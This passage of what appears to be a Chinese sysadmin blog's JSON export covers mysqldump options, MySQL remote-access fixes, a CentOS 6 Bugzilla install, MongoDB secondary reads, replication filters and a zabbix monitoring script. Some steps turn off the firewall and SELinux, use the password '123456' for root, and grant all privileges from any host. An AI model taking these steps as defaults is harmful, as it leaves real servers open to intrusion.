--all-tablespaces--no-tablespaces , -y: 不导出任何表空间信息。mysqldump -uroot -p --all-databases --no-tablespaces--add-drop-database: 每个数据库创建之前添加drop数据库语句。mysqldump -uroot -p --all-databases --add-drop-database --add-drop-table每个数据表创建之前添加drop数据表语句。(默认为打开状态，使用--skip-add-drop-table取消选项)mysqldump -uroot -p --all-databases (默认添加drop语句)mysqldump -uroot -p --all-databases –skip-add-drop-table (取消drop语句)--add-locks: 在每个表导出之前增加LOCK TABLES并且之后UNLOCK TABLE。(默认为打开状态，使用--skip-add-locks取消选项)mysqldump -uroot -p --all-databases (默认添加LOCK语句)mysqldump -uroot -p --all-databases –skip-add-locks (取消LOCK语句)--allow-keywords: 允许创建是关键词的列名字。这由表名前缀于每个列名做到。mysqldump -uroot -p --all-databases --allow-keywords--apply-slave-statements: 在&#39;CHANGE MASTER&#39;前添加&#39;STOP SLAVE&#39;，并且在导出的最后添加&#39;START SLAVE&#39;。mysqldump -uroot -p --all-databases --apply-slave-statements--character-sets-dir:字符集文件的目录mysqldump -uroot -p --all-databases --character-sets-dir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;share&#x2F;mysql&#x2F;charsets--comments: 附加注释信息。默认为打开，可以用--skip-comments取消mysqldump -uroot -p --all-databases (默认记录注释)mysqldump -uroot -p --all-databases --skip-comments (取消注释)--compatible: 导出的数据将和其它数据库或旧版本的MySQL 相兼容。值可以为ansi、mysql323、mysql40、postgresql、oracle、mssql、db2、maxdb、no_key_options、no_tables_options、no_field_options等，要使用几个值，用逗号将它们隔开。它并不保证能完全兼容，而是尽量兼容。mysqldump -uroot -p --all-databases --compatible&#x3D;ansi--compact: 导出更少的输出信息(用于调试)。去掉注释和头尾等结构。mysqldump -uroot -p --all-databases --compact--complete-insert, -c使用完整的insert语句(包含列名称)。这么做能提高插入效率，但是可能会受到max_allowed_packet参数的影响而导致插入失败。mysqldump -uroot -p --all-databases --complete-insert--compress, -C :在客户端和服务器之间启用压缩传递所有信息mysqldump -uroot -p --all-databases --compress--create-options,-a :在CREATE TABLE语句中包括所有MySQL特性选项。(默认为打开状态)mysqldump -uroot -p --all-databases--databases,-B:导出几个数据库。参数后面所有名字参量都被看作数据库名。mysqldump -uroot -p --databases test mysql--debug: 输出debug信息，用于调试。默认值为：d:t,&#x2F;tmp&#x2F;mysqldump.tracemysqldump -uroot -p --all-databases --debugmysqldump -uroot -p --all-databases --debug&#x3D;” d:t,&#x2F;tmp&#x2F;debug.trace”--debug-check: 检查内存和打开文件使用说明并退出。mysqldump -uroot -p --all-databases --debug-check--debug-info: 输出调试信息并退出mysqldump -uroot -p --all-databases --debug-info--default-character-set: 设置默认字符集，默认值为utf8mysqldump -uroot -p --all-databases --default-character-set&#x3D;utf8--delayed-insert: 采用延时插入方式（INSERT DELAYED）导出数据mysqldump -uroot -p --all-databases --delayed-insert--delete-master-logs: master备份后删除日志. 这个参数将自动激活--master-data。mysqldump -uroot -p --all-databases --delete-master-logs--disable-keys对于每个表，用&#x2F;*!40000 ALTER TABLE tbl_name DISABLE KEYS *&#x2F;;和&#x2F;*!40000 ALTER TABLE tbl_name ENABLE KEYS *&#x2F;;语句引用INSERT语句。这样可以更快地导入dump出来的文件，因为它是在插入所有行后创建索引的。该选项只适合MyISAM表，默认为打开状态。mysqldump -uroot -p --all-databases --dump-slave该选项将主的binlog位置和文件名追加到导出数据的文件中(show slave status)。设置为1时，将会以CHANGE MASTER命令输出到数据文件；设置为2时，会在change前加上注释。该选项将会打开--lock-all-tables，除非--single-transaction被指定。该选项会自动关闭--lock-tables选项。默认值为0。mysqldump -uroot -p --all-databases --dump-slave&#x3D;1mysqldump -uroot -p --all-databases --dump-slave&#x3D;2--master-data该选项将当前服务器的binlog的位置和文件名追加到输出文件中(show master status)。如果为1，将会输出CHANGE MASTER 命令；如果为2，输出的CHANGE MASTER命令前添加注释信息。该选项将打开--lock-all-tables 选项，除非--single-transaction也被指定（在这种情况下，全局读锁在开始导出时获得很短的时间；其他内容参考下面的--single-transaction选项）。该选项自动关闭--lock-tables选项。mysqldump -uroot -p --host&#x3D;localhost --all-databases --master-data&#x3D;1;mysqldump -uroot -p --host&#x3D;localhost --all-databases --master-data&#x3D;2;--events, -E : 导出事件。mysqldump -uroot -p --all-databases --events--extended-insert, -e使用具有多个VALUES列的INSERT语法。这样使导出文件更小，并加速导入时的速度。默认为打开状态，使用--skip-extended-insert取消选项。mysqldump -uroot -p --all-databasesmysqldump -uroot -p --all-databases--skip-extended-insert (取消选项)--fields-terminated-by导出文件中忽略给定字段。与--tab选项一起使用，不能用于--databases和--all-databases选项mysqldump -uroot -p test test --tab&#x3D;”&#x2F;home&#x2F;mysql” --fields-terminated-by&#x3D;”#”--fields-enclosed-by输出文件中的各个字段用给定字符包裹。与--tab选项一起使用，不能用于--databases和--all-databases选项mysqldump -uroot -p test test --tab&#x3D;”&#x2F;home&#x2F;mysql” --fields-enclosed-by&#x3D;”#”--fields-optionally-enclosed-by输出文件中的各个字段用给定字符选择性包裹。与--tab选项一起使用，不能用于--databases和--all-databases选项mysqldump -uroot -p test test --tab&#x3D;”&#x2F;home&#x2F;mysql” --fields-enclosed-by&#x3D;”#” --fields-optionally-enclosed-by&#x3D;”#”--fields-escaped-by输出文件中的各个字段忽略给定字符。与--tab选项一起使用，不能用于--databases和--all-databases选项mysqldump -uroot -p mysql user --tab&#x3D;”&#x2F;home&#x2F;mysql” --fields-escaped-by&#x3D;”#”--flush-logs : 开始导出之前刷新日志。请注意：假如一次导出多个数据库(使用选项--databases或者--all-databases)，将会逐个数据库刷新日志。除使用--lock-all-tables或者--master-data外。在这种情况下，日志将会被刷新一次，相应的所以表同时被锁定。因此，如果打算同时导出和刷新日志应该使用--lock-all-tables 或者--master-data 和--flush-logs。mysqldump -uroot -p --all-databases --flush-logs--flush-privileges在导出mysql数据库之后，发出一条FLUSH PRIVILEGES语句。为了正确恢复，该选项应该用于导出mysql数据库和依赖mysql数据库数据的任何时候。mysqldump -uroot -p --all-databases --flush-privileges--force: 在导出过程中忽略出现的SQL错误。mysqldump -uroot -p --all-databases --force--help: 显示帮助信息并退出。mysqldump --help--hex-blob使用十六进制格式导出二进制字符串字段。如果有二进制数据就必须使用该选项。影响到的字段类型有BINARY、VARBINARY、BLOB。mysqldump -uroot -p --all-databases --hex-blob--host, -h : 需要导出的主机信息mysqldump -uroot -p --host&#x3D;localhost --all-databases--ignore-table不导出指定表。指定忽略多个表时，需要重复多次，每次一个表。每个表必须同时指定数据库和表名。例如：--ignore-table&#x3D;database.table1 --ignore-table&#x3D;database.table2 ……mysqldump -uroot -p --host&#x3D;localhost --all-databases --ignore-table&#x3D;mysql.user--include-master-host-port在--dump-slave产生的&#39;CHANGE MASTER TO..&#39;语句中增加&#39;MASTER_HOST&#x3D;&lt;host&gt;，MASTER_PORT&#x3D;&lt;port&gt;&#39; mysqldump -uroot -p --host&#x3D;localhost --all-databases --include-master-host-port--insert-ignore: 在插入行时使用INSERT IGNORE语句.mysqldump -uroot -p --host&#x3D;localhost --all-databases --insert-ignore--lines-terminated-by输出文件的每行用给定字符串划分。与--tab选项一起使用，不能用于--databases和--all-databases选项。mysqldump -uroot -p --host&#x3D;localhost test test --tab&#x3D;”&#x2F;tmp&#x2F;mysql” --lines-terminated-by&#x3D;”##”--lock-all-tables, -x提交请求锁定所有数据库中的所有表，以保证数据的一致性。这是一个全局读锁，并且自动关闭--single-transaction 和--lock-tables 选项。mysqldump -uroot -p --host&#x3D;localhost --all-databases --lock-all-tables--lock-tables, -l开始导出前，锁定所有表。用READ LOCAL锁定表以允许MyISAM表并行插入。对于支持事务的表例如InnoDB和BDB，--single-transaction是一个更好的选择，因为它根本不需要锁定表。请注意当导出多个数据库时，--lock-tables分别为每个数据库锁定表。因此，该选项不能保证导出文件中的表在数据库之间的逻辑一致性。不同数据库表的导出状态可以完全不同。mysqldump -uroot -p --host&#x3D;localhost --all-databases --lock-tables--log-error: 附加警告和错误信息到给定文件mysqldump -uroot -p --host&#x3D;localhost --all-databases --log-error&#x3D;&#x2F;tmp&#x2F;mysqldump_error_log.err--max_allowed_packet: 服务器发送和接受的最大包长度。mysqldump -uroot -p --host&#x3D;localhost --all-databases --max_allowed_packet&#x3D;10240--net_buffer_length : TCP&#x2F;IP和socket连接的缓存大小。mysqldump -uroot -p --host&#x3D;localhost --all-databases --net_buffer_length&#x3D;1024--no-autocommit: 使用autocommit&#x2F;commit 语句包裹表。mysqldump -uroot -p --host&#x3D;localhost --all-databases --no-autocommit--no-create-db, -n: 只导出数据，而不添加CREATE DATABASE 语句。mysqldump -uroot -p --host&#x3D;localhost --all-databases --no-create-db--no-create-info,-t :只导出数据，而不添加CREATE TABLE 语句。mysqldump -uroot -p --host&#x3D;localhost --all-databases --no-create-info--no-data, -d : 不导出任何数据，只导出数据库表结构。mysqldump -uroot -p --host&#x3D;localhost --all-databases --no-data--no-set-names,-N :等同于--skip-set-charsetmysqldump -uroot -p --host&#x3D;localhost --all-databases --no-set-names--opt等同于--add-drop-table, --add-locks, --create-options, --quick, --extended-insert, --lock-tables, --set-charset, --disable-keys 该选项默认开启, 可以用--skip-opt禁用.mysqldump -uroot -p --host&#x3D;localhost --all-databases --opt--order-by-primary如果存在主键，或者第一个唯一键，对每个表的记录进行排序。在导出MyISAM表到InnoDB表时有效，但会使得导出工作花费很长时间。 mysqldump -uroot -p --host&#x3D;localhost --all-databases --order-by-primary--password, -p :连接数据库密码--port, -P :连接数据库端口号--protocol :使用的连接协议，包括：tcp, socket, pipe, memory.mysqldump -uroot -p --host&#x3D;localhost --all-databases --protocol&#x3D;tcp--quick, -q :不缓冲查询，直接导出到标准输出。默认为打开状态，使用--skip-quick取消该选项。mysqldump -uroot -p --host&#x3D;localhost --all-databases mysqldump -uroot -p --host&#x3D;localhost --all-databases --skip-quick--quote-names,-Q :使用（&#96;）引起表和列名。默认为打开状态，使用--skip-quote-names取消该选项。mysqldump -uroot -p --host&#x3D;localhost --all-databasesmysqldump -uroot -p --host&#x3D;localhost --all-databases --skip-quote-names--replace :使用REPLACE INTO 取代INSERT INTO.mysqldump -uroot -p --host&#x3D;localhost --all-databases --replace--result-file, -r直接输出到指定文件中。该选项应该用在使用回车换行对（\\\\r\\\\n）换行的系统上（例如：DOS，Windows）。该选项确保只有一行被使用。mysqldump -uroot -p --host&#x3D;localhost --all-databases --result-file&#x3D;&#x2F;tmp&#x2F;mysqldump_result_file.txt--routines, -R :导出存储过程以及自定义函数。mysqldump -uroot -p --host&#x3D;localhost --all-databases --routines--set-charset添加&#39;SET NAMES default_character_set&#39;到输出文件。默认为打开状态，使用--skip-set-charset关闭选项。mysqldump -uroot -p --host&#x3D;localhost --all-databases mysqldump -uroot -p --host&#x3D;localhost --all-databases --skip-set-charset--single-transaction该选项在导出数据之前提交一个BEGIN SQL语句，BEGIN 不会阻塞任何应用程序且能保证导出时数据库的一致性状态。它只适用于多版本存储引擎，仅InnoDB。本选项和--lock-tables 选项是互斥的，因为LOCK TABLES 会使任何挂起的事务隐含提交。要想导出大表的话，应结合使用--quick 选项。mysqldump -uroot -p --host&#x3D;localhost --all-databases --single-transaction--dump-date :将导出时间添加到输出文件中。默认为打开状态，使用--skip-dump-date关闭选项。mysqldump -uroot -p --host&#x3D;localhost --all-databasesmysqldump -uroot -p --host&#x3D;localhost --all-databases --skip-dump-date--skip-opt: 禁用–opt选项.mysqldump -uroot -p --host&#x3D;localhost --all-databases --skip-opt--socket,-S指定连接mysql的socket文件位置，默认路径&#x2F;tmp&#x2F;mysql.sockmysqldump -uroot -p --host&#x3D;localhost --all-databases --socket&#x3D;&#x2F;tmp&#x2F;mysqld.sock--tab,-T为每个表在给定路径创建tab分割的文本文件。注意：仅仅用于mysqldump和mysqld服务器运行在相同机器上。注意使用--tab不能指定--databases参数mysqldump -uroot -p --host&#x3D;localhost test test --tab&#x3D;&quot;&#x2F;home&#x2F;mysql&quot;--tables覆盖--databases (-B)参数，指定需要导出的表名，在后面的版本会使用table取代tables。mysqldump -uroot -p --host&#x3D;localhost --databases test --tables test--triggers: 导出触发器。该选项默认启用，用--skip-triggers禁用它。mysqldump -uroot -p --host&#x3D;localhost --all-databases --triggers--tz-utc在导出顶部设置时区TIME_ZONE&#x3D;&#39;+00:00&#39; ，以保证在不同时区导出的TIMESTAMP 数据或者数据被移动其他时区时的正确性。mysqldump -uroot -p --host&#x3D;localhost --all-databases --tz-utc--user, -u :指定连接的用户名。--verbose, --v :输出多种平台信息。--version, -V :输出mysqldump版本信息并退出--where, -w只转储给定的WHERE条件选择的记录。请注意如果条件包含命令解释符专用空格或字符，一定要将条件引用起来。mysqldump -uroot -p --host&#x3D;localhost --all-databases --where&#x3D;” user&#x3D;’root’”--xml, -X :导出XML格式.mysqldump -uroot -p --host&#x3D;localhost --all-databases --xml--plugin_dir :客户端插件的目录，用于兼容不同的插件版本。mysqldump -uroot -p --host&#x3D;localhost --all-databases --plugin_dir&#x3D;”&#x2F;usr&#x2F;local&#x2F;lib&#x2F;plugin”--default_auth :客户端插件默认使用权限。mysqldump -uroot -p --host&#x3D;localhost --all-databases --default-auth&#x3D;”&#x2F;usr&#x2F;local&#x2F;lib&#x2F;plugin&#x2F;&lt;PLUGIN&gt;”","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"mysqldump详解","slug":"mysqldump详解","permalink":"https://garywu520.github.io/tags/mysqldump%E8%AF%A6%E8%A7%A3/"},{"name":"mysql导入导出","slug":"mysql导入导出","permalink":"https://garywu520.github.io/tags/mysql%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"}]},{"title":"mysql用户远程登录失败--Host is not allowed to connect to this MySQL server","slug":"mysql用户远程登录失败","date":"2018-07-25T02:13:55.000Z","updated":"2018-07-25T02:31:00.541Z","comments":true,"path":"2018/07/25/mysql用户远程登录失败/","link":"","permalink":"https://garywu520.github.io/2018/07/25/mysql%E7%94%A8%E6%88%B7%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/","excerpt":"故障描述12mysql远程登录失败，错误如下：Host &#39;X.X.X.X&#39; is not allowed to connect to this MySQL server.","text":"故障描述12mysql远程登录失败，错误如下：Host &#39;X.X.X.X&#39; is not allowed to connect to this MySQL server. 原因1当前使用的用户不允许从远程登录 解决方案方案1：更改用户表 12345mysql &gt; use mysql;mysql &gt; update user set host &#x3D; &#39;%&#39; where user &#x3D; &#39;usr_name&#39;;;其中， usr_name 用户名； 而 &#39;%&#39; 为通配符，表示匹配所有主机。 方案2：命令行授权 12345mysql &gt; grant all privileges on db_name.* to usr_name@&#39;%&#39; identified by &#39;user_password&#39;;mysql &gt; flush privileges ;其中，db_name 是数据库名， usr_name 用户名， pwd 密码。&#39;%&#39; 为通配符。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"root远程登录","slug":"root远程登录","permalink":"https://garywu520.github.io/tags/root%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95/"}]},{"title":"vim打开文件中文乱码问题","slug":"vim打开文件中文乱码问题","date":"2018-07-12T04:16:26.000Z","updated":"2018-07-12T06:24:36.119Z","comments":true,"path":"2018/07/12/vim打开文件中文乱码问题/","link":"","permalink":"https://garywu520.github.io/2018/07/12/vim%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/","excerpt":"","text":"1vim ~&#x2F;.vimrc 123set encoding&#x3D;utf-8set fenc&#x3D;utf-8set fencs&#x3D;utf-8,usc-bom,euc-jp,gb18030,gbk,gbk2312,cp936 1现在试试中文乱码就消失了 GitHub参考：.vimrc配置","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"vim","slug":"vim","permalink":"https://garywu520.github.io/tags/vim/"},{"name":"中文乱码","slug":"中文乱码","permalink":"https://garywu520.github.io/tags/%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81/"}]},{"title":"CentOS6部署bugzilla","slug":"CentOS6部署bugzilla","date":"2018-07-11T06:17:03.000Z","updated":"2018-07-11T10:32:20.679Z","comments":true,"path":"2018/07/11/CentOS6部署bugzilla/","link":"","permalink":"https://garywu520.github.io/2018/07/11/CentOS6%E9%83%A8%E7%BD%B2bugzilla/","excerpt":"Bugzilla介绍123Bugzilla 是一个开源的缺陷跟踪系统（Bug-Tracking System），它可以管理软件开发中缺陷的提交（new），修复（resolve），关闭（close）等整个生命周期。它可以使我们更好的在软件开发过程中跟踪软件错误的处理过程，为开发和测试工作以及产品质量的度量提供数据支持。并能够为你建立一个完善的 Bug 跟踪体系, 包括报告Bug、查询Bug记录并产生报表。","text":"Bugzilla介绍123Bugzilla 是一个开源的缺陷跟踪系统（Bug-Tracking System），它可以管理软件开发中缺陷的提交（new），修复（resolve），关闭（close）等整个生命周期。它可以使我们更好的在软件开发过程中跟踪软件错误的处理过程，为开发和测试工作以及产品质量的度量提供数据支持。并能够为你建立一个完善的 Bug 跟踪体系, 包括报告Bug、查询Bug记录并产生报表。 部署Bugzilla12系统环境：CentOS6.9由于需要使用其提供的自动化脚本安装很多依赖库，故不建议使用小众Linux 系统优化12345关闭防火墙service iptables stop关闭selinuxsetenforce 0 安装Apache|MySQL及相关依赖12345yum -y install httpd mod_ssl mysql-server mysql php-mysql gcc perl* mod_perl-develservice httpd startchkconfig httpd onservice mysqld startservice mysqld on 设置mysql root密码12345678910mysql密码默认为空，需修改如下：mysqladmin -uroot -p password &quot;123456&quot;登陆测试mysql -uroot -p123456创建数据库名为bugscreate database bugs;grant all on bugs.* to root@localhost identified by &quot;123456&quot;;flush privileges; 下载安装bugzilla123官网:https:&#x2F;&#x2F;www.bugzilla.org&#x2F;download&#x2F;或https:&#x2F;&#x2F;archive.mozilla.org&#x2F;pub&#x2F;webtools&#x2F; 1234567891011121314151617181920212223242526272829303132以bugzilla-5.0.3.tar.gz为例：解压tar xf bugzilla-5.0.3.tar.gz -C &#x2F;var&#x2F;www&#x2F;html&#x2F;重命名源码目录cd &#x2F;var&#x2F;www&#x2F;htmlmv bugzilla-5.0.3 bugzilla检查缺少的组件cd &#x2F;var&#x2F;www&#x2F;html&#x2F;bugzilla.&#x2F;checksetup.pl --check-modules自动化安装缺少的组件perl install-module.pl --all运行以下这条命令，它会在&#x2F;var&#x2F;www&#x2F;html&#x2F;bugzilla路径下自动生成一个名为localconfig的文件。.&#x2F;checksetup.pl主要修改以下数据库相关信息vim localconfig$db_driver &#x3D; &#39;mysql&#39;;$db_host &#x3D; &#39;localhost&#39;;$db_name &#x3D; &#39;bugs&#39;;$db_user &#x3D; &#39;root&#39;;$db_pass &#x3D; &#39;123456&#39;;$db_port &#x3D; 3306;最后，再次执行以下命令根据提示输入管理员邮箱及密码.&#x2F;checksetup.pl 配置Apache123456789101112vi &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf 在配置文件底部添加如下内容：&lt;VirtualHost *:80&gt; DocumentRoot &#x2F;var&#x2F;www&#x2F;html&#x2F;bugzilla&#x2F;&lt;&#x2F;VirtualHost&gt;&lt;Directory &#x2F;var&#x2F;www&#x2F;html&#x2F;bugzilla&gt; AddHandler cgi-script .cgi Options +Indexes +ExecCGI DirectoryIndex index.cgi AllowOverride Limit FileInfo Indexes&lt;&#x2F;Directory&gt; 123接着需要编辑.htacess文件，注释掉以下内容,保存：vim &#x2F;var&#x2F;www&#x2F;html&#x2F;bugzilla&#x2F;.htaccess#Options -Indexes 1234重启Apache服务，浏览器测试访问service httpd restart浏览器： http:&#x2F;&#x2F;server-ip 关于Bugzilla源码和数据库迁移1234567注意事项：1. 首先在新机器上按照如上步骤完整部署一套，目的是安装完所有依赖。2. 将原数据库中的bugs通过mysqldump导出一份sql文件3. 将原bugs.sql导入到新库名为bugzilla数据库中，并修改新部署的一套源码中localconfig文件，修改数据库设置，重启apache服务，如果能正常使用，则迁移完毕。4. 若无法登陆，可能之前版本嵌入了LDAP账号，此时就需要把原bugzilla代码目录整个压缩拷贝过来，并修改localconfig文件为最新mysql数据库信息，重启mysql，访问并测试。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"bugzilla","slug":"bugzilla","permalink":"https://garywu520.github.io/tags/bugzilla/"},{"name":"bugs","slug":"bugs","permalink":"https://garywu520.github.io/tags/bugs/"}]},{"title":"Mongo Slave节点无法show dbs","slug":"Mongo-Slave节点无法show-dbs","date":"2018-07-09T08:00:54.000Z","updated":"2018-07-09T08:08:30.880Z","comments":true,"path":"2018/07/09/Mongo-Slave节点无法show-dbs/","link":"","permalink":"https://garywu520.github.io/2018/07/09/Mongo-Slave%E8%8A%82%E7%82%B9%E6%97%A0%E6%B3%95show-dbs/","excerpt":"在SECONDARY节点无法show dbs 123主从启动之后，连接slave可以成功连上，但是在slave中执行 show dbs 的时候就报错了:QUERY Error: listDatabases failed:&#123; &quot;note&quot; : &quot;from execCommand&quot;, &quot;ok&quot; : 0, &quot;errmsg&quot; : &quot;not master&quot; &#125;","text":"在SECONDARY节点无法show dbs 123主从启动之后，连接slave可以成功连上，但是在slave中执行 show dbs 的时候就报错了:QUERY Error: listDatabases failed:&#123; &quot;note&quot; : &quot;from execCommand&quot;, &quot;ok&quot; : 0, &quot;errmsg&quot; : &quot;not master&quot; &#125; 解决方法 12在报错的slave机器上执行 rs.slaveOk() 再执行show dbs即可 官网解释 1234Provides a shorthand for the following operation: db.getMongo().setSlaveOk()This allows the current connection to allow read operations to run on secondary members. See the readPref() method for more fine-grained control over read preference in the mongo shell.","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"SECONDARY","slug":"SECONDARY","permalink":"https://garywu520.github.io/tags/SECONDARY/"},{"name":"PRIMARY","slug":"PRIMARY","permalink":"https://garywu520.github.io/tags/PRIMARY/"},{"name":"MongoDB","slug":"MongoDB","permalink":"https://garywu520.github.io/tags/MongoDB/"},{"name":"slave","slug":"slave","permalink":"https://garywu520.github.io/tags/slave/"},{"name":"show dbs","slug":"show-dbs","permalink":"https://garywu520.github.io/tags/show-dbs/"}]},{"title":"mysql从库-只同步某些库","slug":"mysql从库-只同步某些库","date":"2018-07-06T09:54:12.000Z","updated":"2018-07-06T10:09:38.923Z","comments":true,"path":"2018/07/06/mysql从库-只同步某些库/","link":"","permalink":"https://garywu520.github.io/2018/07/06/mysql%E4%BB%8E%E5%BA%93-%E5%8F%AA%E5%90%8C%E6%AD%A5%E6%9F%90%E4%BA%9B%E5%BA%93/","excerpt":"","text":"1生产环境需求：从库同步时，限定只同步某些数据库，而非全部同步，如何优雅逆袭？ 配置 123456789vim &#x2F;etc&#x2F;my.cnf[mysqld]......replicate_wild_do_table&#x3D;db1.%replicate_wild_do_table&#x3D;db2.%replicate_wild_do_table&#x3D;db3.%db1到db3是需要同步的数据库名，如果复制多个数据库，重复设置这个选项即可。 1重启mysql","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"mysql从库","slug":"mysql从库","permalink":"https://garywu520.github.io/tags/mysql%E4%BB%8E%E5%BA%93/"},{"name":"同步个别库","slug":"同步个别库","permalink":"https://garywu520.github.io/tags/%E5%90%8C%E6%AD%A5%E4%B8%AA%E5%88%AB%E5%BA%93/"}]},{"title":"mysqldump备份避免锁表","slug":"mysqldump备份避免锁表","date":"2018-07-02T04:09:26.000Z","updated":"2018-07-02T04:26:27.768Z","comments":true,"path":"2018/07/02/mysqldump备份避免锁表/","link":"","permalink":"https://garywu520.github.io/2018/07/02/mysqldump%E5%A4%87%E4%BB%BD%E9%81%BF%E5%85%8D%E9%94%81%E8%A1%A8/","excerpt":"1生产环境中,场景难免会遇到对正在运行的数据库进行备份，而mysqldump备份会有锁表风险，导致数据在备份期间无法写入数据，所以对正在运行的数据库备份需要慎重。下面就聊聊如何解决锁表？","text":"1生产环境中,场景难免会遇到对正在运行的数据库进行备份，而mysqldump备份会有锁表风险，导致数据在备份期间无法写入数据，所以对正在运行的数据库备份需要慎重。下面就聊聊如何解决锁表？ mysqldump命令备份Mysql数据库的参数说明12345678910-q 采用快速的dump方式(提高导出性能)-e 采用多重insert语句形式(提高还原性能)-R 导出存储过程，函数，和触发器--events 如果是5.1以上的版本使用，包含事件--skip-opt 避免锁表--create-option 添加create相关的选项--single-transaction 一致性备份--no-autocommit 采用批量提交方式(提高还原性能)--master-data 如果有写log-bin且版本为5.0以上的版本，则再加上 --master-data&#x3D;2 改良mysqldump备份命令123我的版本是MySQL-5.7.11,启用了binlog，所以应使用如下命令备份数据库mysqldump -uroot -p --events --single-transaction --master-data&#x3D;2 --skip-opt --databases db1 db2 &gt;&#x2F;root&#x2F;mysql.sql 其他1mysqldump命令适用于对数据库相对较小的MySQL进行备份，一般数据量约50GB以内，大于50GB强烈建议使用xtrabackup工具。 参考：MySql xtrabackup大数据量备份与还原","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"MySQL","slug":"MySQL","permalink":"https://garywu520.github.io/tags/MySQL/"},{"name":"mysqldump","slug":"mysqldump","permalink":"https://garywu520.github.io/tags/mysqldump/"},{"name":"innobackup","slug":"innobackup","permalink":"https://garywu520.github.io/tags/innobackup/"},{"name":"xtrabackup","slug":"xtrabackup","permalink":"https://garywu520.github.io/tags/xtrabackup/"},{"name":"锁表","slug":"锁表","permalink":"https://garywu520.github.io/tags/%E9%94%81%E8%A1%A8/"}]},{"title":"shell变量传参","slug":"shell变量传参","date":"2018-06-22T07:54:54.000Z","updated":"2018-06-22T08:53:43.784Z","comments":true,"path":"2018/06/22/shell变量传参/","link":"","permalink":"https://garywu520.github.io/2018/06/22/shell%E5%8F%98%E9%87%8F%E4%BC%A0%E5%8F%82/","excerpt":"1有时候经常会写传参脚本，下面是一个zabbix自定义key传参案例 zabbix配置文件123456UnsafeUserParameters&#x3D;1#mysql slave监控UserParameter&#x3D;mysql.slave[*],&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;check_mysql_slave.sh $1注：留意下这个key值，后面是*表示所有","text":"1有时候经常会写传参脚本，下面是一个zabbix自定义key传参案例 zabbix配置文件123456UnsafeUserParameters&#x3D;1#mysql slave监控UserParameter&#x3D;mysql.slave[*],&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;check_mysql_slave.sh $1注：留意下这个key值，后面是*表示所有 自定义key传参脚本1vim check_mysql.sh 123456789101112131415161718192021222324252627282930#!&#x2F;bin&#x2F;bashUSER&#x3D;xxxPASS&#x3D;xxxxxxio_status()&#123; IoStatus&#x3D;&#96;mysql -u$&#123;USER&#125; -p$&#123;PASS&#125; -e &quot;show slave status\\G;&quot; |grep -i running|sed -n 1p|awk &#39;&#123;print $NF&#125;&#39;&#96; if [ $IoStatus &#x3D;&#x3D; &quot;Yes&quot; ];then IoStatus&#x3D;1 else IoStatus&#x3D;0 fi echo $IoStatus&#125;sql_status()&#123; SqlStatus&#x3D;&#96;mysql -u$&#123;USER&#125; -p$&#123;PASS&#125; -e &quot;show slave status\\G;&quot; |grep -i running|sed -n 2p|awk &#39;&#123;print $NF&#125;&#39;&#96; if [ $SqlStatus &#x3D;&#x3D; &quot;Yes&quot; ];then SqlStatus&#x3D;1 else SqlStatus&#x3D;0 fi echo $SqlStatus&#125;lag_status()&#123; DelayStatus&#x3D;&#96;mysql -u$&#123;USER&#125; -p$&#123;PASS&#125; -e &quot;show slave status\\G;&quot; |grep &quot;Seconds_Behind_Master&quot;|awk &#39;&#123;print $NF&#125;&#39;&#96; echo $DelayStatus&#125;$1 1234567如何快速理解脚本传参逻辑？(1)可以看到整个脚本使用了3个函数,要知道，写了函数需要在脚本调用才会生效，而本脚本中是使用$1来进行调用的。(2)从脚本中可以看到，对应的传参值分别为io_status、sql_status和lag_status, 其他传参值将不会被调用。(3)zabbix mysql模板中自定义key名称与脚本函数名称相同，所以可以被正确赋值给$1并正确取值。 疑问1如果zabbix mysql模板中自定义key名称不是 io_status、sql_status和lag_status，依然能被正确调用？ 1需要在脚本中, 加入判断。如果$1等于zabbix mysql模板中的某个值，则执行脚本中其中一个函数。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"变量传参","slug":"变量传参","permalink":"https://garywu520.github.io/tags/%E5%8F%98%E9%87%8F%E4%BC%A0%E5%8F%82/"},{"name":"shell传参","slug":"shell传参","permalink":"https://garywu520.github.io/tags/shell%E4%BC%A0%E5%8F%82/"}]},{"title":"MariaDB Galera 